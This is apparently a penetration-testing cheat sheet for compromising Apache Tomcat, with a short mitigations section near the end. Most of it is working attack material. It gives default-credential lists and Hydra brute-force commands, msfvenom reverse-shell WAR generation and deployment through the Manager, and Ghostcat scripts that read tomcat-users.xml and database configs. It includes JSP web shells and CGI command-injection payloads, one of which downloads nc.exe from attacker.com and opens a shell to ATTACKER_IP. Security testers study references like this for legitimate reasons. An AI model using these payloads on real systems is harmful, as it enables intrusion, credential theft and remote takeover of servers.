## 1. Overview

Apache Tomcat is a widely-used Java servlet container and web server. Security issues arise from:

- **Default configurations** exposing example applications and sensitive files
- **Weak credentials** on management interfaces (Manager, Host Manager)
- **Known CVEs** affecting specific versions (v4.x through v10.x)
- **Information disclosure** through error pages, status endpoints, and documentation
- **Path traversal** vulnerabilities in older versions
- **Deserialization attacks** via AJP connector and specific components

---

## 2. Exploitation Methods

### 2.1 Discovery & Enumeration

**Check for Default Example Applications:**

```text
/examples/jsp/num/numguess.jsp
/examples/jsp/dates/date.jsp
/examples/jsp/snp/snoop.jsp
/examples/jsp/error/error.html
/examples/jsp/sessions/carts.html
/examples/jsp/checkbox/check.html
/examples/jsp/colors/colors.html
/examples/jsp/cal/login.html
/examples/jsp/include/include.jsp
/examples/jsp/forward/forward.jsp
/examples/jsp/plugin/plugin.jsp
/examples/jsp/jsptoserv/jsptoservlet.jsp
/examples/jsp/simpletag/foo.jsp
/examples/jsp/mail/sendmail.jsp
/examples/servlet/HelloWorldExample
/examples/servlet/RequestInfoExample
/examples/servlet/RequestHeaderExample
/examples/servlet/RequestParamExample
/examples/servlet/CookieExample
/examples/servlet/JndiServlet
/examples/servlet/SessionExample
/tomcat-docs/appdev/sample/web/hello.jsp
```

**Management Interfaces:**

```text
/manager/html
/manager/text
/manager/jmxproxy
/manager/status
/host-manager/html
```

**Version Fingerprinting:**

```text
/docs/
/RELEASE-NOTES.txt
/docs/changelog.html
Server: Apache-Coyote/1.1 (header)
```

**Configuration Files (if accessible):**

```text
$TOMCAT_HOME/conf/tomcat-users.xml
$TOMCAT_HOME/conf/server.xml
$TOMCAT_HOME/conf/web.xml
```

---

### 2.2 Manager Application Exploitation

**Default Credentials to Test:**

```text
admin:admin
tomcat:tomcat
admin:tomcat
tomcat:s3cret
admin:password
tomcat:password
admin:s3cret
manager:manager
role1:role1
root:root
both:tomcat
```

**Steps:**

1. **Access `/manager/html`** or `/manager/text`
2. **Try default credentials** via Basic Auth
3. **Deploy malicious WAR file** if authenticated

**Deploy WAR Shell (via curl):**

```bash
# Create JSP shell
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<YOUR_IP> LPORT=4444 -f war > shell.war

# Deploy via Manager
curl -u 'tomcat:tomcat' --upload-file shell.war "http://target.com/manager/text/deploy?path=/shell"

# Trigger shell
curl http://target.com/shell/
```

**Deploy via GUI:**

1. Login to `/manager/html`
2. Scroll to "WAR file to deploy"
3. Upload `shell.war`
4. Access deployed path `/shell`

---

### 2.3 Path Traversal (CVE-2020-1938 - Ghostcat)

**Affected Versions:**

- Apache Tomcat 6.x
- Apache Tomcat 7.x < 7.0.100
- Apache Tomcat 8.x < 8.5.51
- Apache Tomcat 9.x < 9.0.31

**Exploit via AJP Connector (port 8009):**

```bash
# Using exploit script
git clone https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi
cd CNVD-2020-10487-Tomcat-Ajp-lfi
python tomcat-ajp.py target.com -p 8009 -f WEB-INF/web.xml

# Read tomcat-users.xml
python tomcat-ajp.py target.com -p 8009 -f /WEB-INF/web.xml
python tomcat-ajp.py target.com -p 8009 -f /conf/tomcat-users.xml
```

**What to Read:**

```text
WEB-INF/web.xml (app configs, servlet mappings)
WEB-INF/classes/* (compiled Java classes)
META-INF/context.xml (database credentials)
conf/tomcat-users.xml (user credentials)
```

---

### 2.4 CGI Servlet RCE (CVE-2019-0232)

**Affected:** Windows systems running Tomcat with CGI enabled

**Requirements:**

- CGI Servlet enabled (`enableCmdLineArguments=true`)
- Windows OS
- Access to a CGI script

**Exploit:**

```bash
# Command injection via CGI parameters
curl "http://target.com/cgi-bin/test.bat?&dir"
curl "http://target.com/cgi-bin/test.bat?&calc.exe"

# Reverse shell
curl "http://target.com/cgi-bin/test.bat?&powershell+-c+IEX(New-Object+Net.WebClient).downloadString('http://yourserver/shell.ps1')"
```

---

### 2.5 JMX/JMXProxy Exploitation

**Access JMX Proxy:**

```text
/manager/jmxproxy
```

**Enumerate Beans:**

```bash
curl -u 'admin:admin' http://target.com/manager/jmxproxy/
```

**Invoke Operations (if writable):**

```bash
# Get system properties
curl -u 'admin:admin' http://target.com/manager/jmxproxy/?get=java.lang:type=Runtime&att=SystemProperties

# Execute commands (if MBean allows)
curl -u 'admin:admin' http://target.com/manager/jmxproxy/?invoke=...
```

---

### 2.6 Session Prediction/Fixation

**Test Session Generation:**

```bash
# Generate multiple sessions and analyze patterns
for i in {1..20}; do
  curl -i http://target.com/login | grep JSESSIONID
done
```

**Session Fixation:**

```bash
# Force victim to use attacker-controlled session
http://target.com/login;jsessionid=ATTACKER_SESSION_ID
```

---

## 3. Bypasses

### 3.1 Manager Authentication Bypass

**Case Sensitivity Bypass (older versions):**

```text
/Manager/html (capital M)
/MANAGER/html
/manager/HTML
```

**Path Normalization:**

```text
/./manager/html
/manager/./html
/manager/html/..;/manager/html
```

**HTTP Method Bypass:**

```bash
# Try different methods if GET is blocked
curl -X PUT http://target.com/manager/html
curl -X POST http://target.com/manager/html
```

---

### 3.2 Access Control Bypass

**Null Byte Injection (older versions):**

```text
/manager/html%00
/manager/html%00.jpg
```

**Unicode/UTF-8 Bypass:**

```text
/manager%2fhtml
/%6D%61%6E%61%67%65%72/html
```

---

## 4. Top Payloads

### 4.1 JSP Web Shells

**Minimal JSP Shell:**

```jsp
<%@ page import="java.io.*" %>
<%
  String cmd = request.getParameter("cmd");
  Process p = Runtime.getRuntime().exec(cmd);
  BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
  String line;
  while((line = br.readLine()) != null) {
    out.println(line + "<br>");
  }
%>
```

**One-liner JSP Shell:**

```jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

**File Upload JSP:**

```jsp
<%@ page import="java.io.*,java.util.*,javax.servlet.*,javax.servlet.http.*" %>
<%
  String saveFile = request.getParameter("path");
  FileOutputStream fos = new FileOutputStream(saveFile);
  fos.write(request.getParameter("content").getBytes());
  fos.close();
  out.println("File saved: " + saveFile);
%>
```

---

### 4.2 WAR File Shells

**Generate with msfvenom:**

```bash
# JSP reverse shell
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f war > shell.war

# Bind shell
msfvenom -p java/jsp_shell_bind_tcp LPORT=4444 -f war > bind.war

# Meterpreter
msfvenom -p java/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f war > meterpreter.war
```

**Manual WAR Creation:**

```bash
mkdir webshell
cd webshell
# Create shell.jsp (any JSP shell above)
echo '<%@ page import="java.io.*" %><% Runtime.getRuntime().exec(request.getParameter("cmd")); %>' > shell.jsp

# Create WEB-INF/web.xml
mkdir -p WEB-INF
cat > WEB-INF/web.xml << EOF
<?xml version="1.0"?>
<web-app xmlns="http://java.sun.com/xml/ns/j2ee" version="2.4">
</web-app>
EOF

# Package as WAR
jar -cvf ../shell.war *
```

---

### 4.3 AJP Ghostcat Payloads

**Read sensitive files:**

```bash
# tomcat-users.xml
python ajploit.py target.com -p 8009 -f conf/tomcat-users.xml

# web.xml (servlet configs)
python ajploit.py target.com -p 8009 -f WEB-INF/web.xml

# Database configs
python ajploit.py target.com -p 8009 -f META-INF/context.xml

# Source code
python ajploit.py target.com -p 8009 -f WEB-INF/classes/com/example/App.class
```

---

### 4.4 CGI RCE Payloads (Windows)

```text
?&dir
?&dir+c:\
?&type+c:\windows\win.ini
?&whoami
?&ipconfig
?&net+user
?&powershell+-c+whoami
?&cmd+/c+certutil+-urlcache+-split+-f+http://attacker.com/nc.exe+c:\windows\temp\nc.exe
?&c:\windows\temp\nc.exe+-e+cmd.exe+ATTACKER_IP+4444
```

---

### 4.5 Authentication Bruteforce

**Hydra:**

```bash
hydra -L users.txt -P passwords.txt target.com http-get /manager/html
```

**Burp Intruder Payload Positions:**

```http
GET /manager/html HTTP/1.1
Host: target.com
Authorization: Basic §BASE64(user:pass)§
```

---

## 5. Higher Impact Scenarios

### 5.1 Manager Access → Full System Compromise

**Chain:**

1. **Weak creds** → Manager access
2. **Deploy WAR shell** → Code execution as Tomcat user
3. **Privilege escalation** → Root/SYSTEM
4. **Lateral movement** → Internal network access

---

### 5.2 Ghostcat → Database Credential Theft

**Steps:**

1. Use **Ghostcat** to read `META-INF/context.xml`
2. Extract **database credentials**
3. Connect to **internal database**
4. **Dump data** or pivot to database server

**context.xml example:**

```xml
<Context>
  <Resource name="jdbc/MyDB" 
    auth="Container"
    type="javax.sql.DataSource"
    username="dbuser"
    password="SuperSecret123"
    driverClassName="com.mysql.jdbc.Driver"
    url="jdbc:mysql://db.internal:3306/prod"/>
</Context>
```

---

### 5.3 Information Disclosure → Credential Leakage

**Exposed files:**

- `/tomcat-users.xml` → Manager passwords
- `/web.xml` → API keys in init-params
- `/logs/` → Session tokens, stack traces with paths
- `/docs/` → Version info for targeted exploits

**Escalation:**

1. **Read tomcat-users.xml** via path traversal
2. **Use credentials** to access Manager
3. **Deploy shell** as described above

---

### 5.4 AJP Connector Exposed → Internal Network Pivot

**If port 8009 is exposed externally:**

1. **Ghostcat** to read files
2. Extract **internal IP ranges** from configs
3. Use **Tomcat as proxy** to reach internal services
4. **Pivot** to internal network

---

### 5.5 Session Hijacking → Account Takeover

**If session tokens are predictable:**

1. **Analyze session generation** algorithm
2. **Predict valid session IDs**
3. **Hijack active sessions** → Impersonate users
4. **Access sensitive data** or admin panels

---

## 6. Mitigations

### For Defenders

**Remove Default Applications:**

```bash
rm -rf $TOMCAT_HOME/webapps/examples
rm -rf $TOMCAT_HOME/webapps/docs
rm -rf $TOMCAT_HOME/webapps/host-manager
rm -rf $TOMCAT_HOME/webapps/manager  # If not needed
```

**Secure Manager Application:**

- Use **strong passwords** (20+ chars, random)
- **Restrict by IP** in `manager/META-INF/context.xml`:

```xml
<Context>
  <Valve className="org.apache.catalina.valves.RemoteAddrValve"
         allow="127\.0\.0\.1|192\.168\.1\..*" />
</Context>
```

**Disable AJP Connector (if not needed):**

Edit `$TOMCAT_HOME/conf/server.xml`:

```xml
<!-- Comment out or remove -->
<!-- <Connector port="8009" protocol="AJP/1.3" redirectPort="8443" /> -->
```

**Harden Configurations:**

- Set `server` attribute to remove version info:

```xml
<Connector port="8080" protocol="HTTP/1.1" server="Apache" />
```

- Disable directory listing in `web.xml`:

```xml
<servlet>
  <servlet-name>default</servlet-name>
  <init-param>
    <param-name>listings</param-name>
    <param-value>false</param-value>
  </init-param>
</servlet>
```

**Patch Regularly:**

- Monitor [Tomcat Security](https://tomcat.apache.org/security.html) page
- Apply **patches immediately** for critical CVEs
- Use **latest stable version** (currently 10.x or 9.x)

**File Permissions:**

```bash
chmod 600 $TOMCAT_HOME/conf/tomcat-users.xml
chown tomcat:tomcat $TOMCAT_HOME/conf/*
```

**Network Segmentation:**

- **Firewall Manager** ports (8080, 8443) from internet
- **Restrict AJP** (8009) to localhost only
- Use **reverse proxy** (nginx/Apache) in front of Tomcat

**Logging & Monitoring:**

- Enable **access logs** in `server.xml`
- Monitor for:
    - Failed authentication attempts
    - WAR deployments
    - Access to `/manager/`, `/examples/`
    - AJP connections from unexpected IPs

---

**Quick Win Checklist:**

- ✅ Test all example URLs
- ✅ Bruteforce `/manager/html` with common creds
- ✅ Check for AJP on port 8009 (Ghostcat)
- ✅ Try path traversal on CGI scripts (Windows)
- ✅ Read version from `/docs/` or headers
- ✅ Search Exploit-DB for version-specific CVEs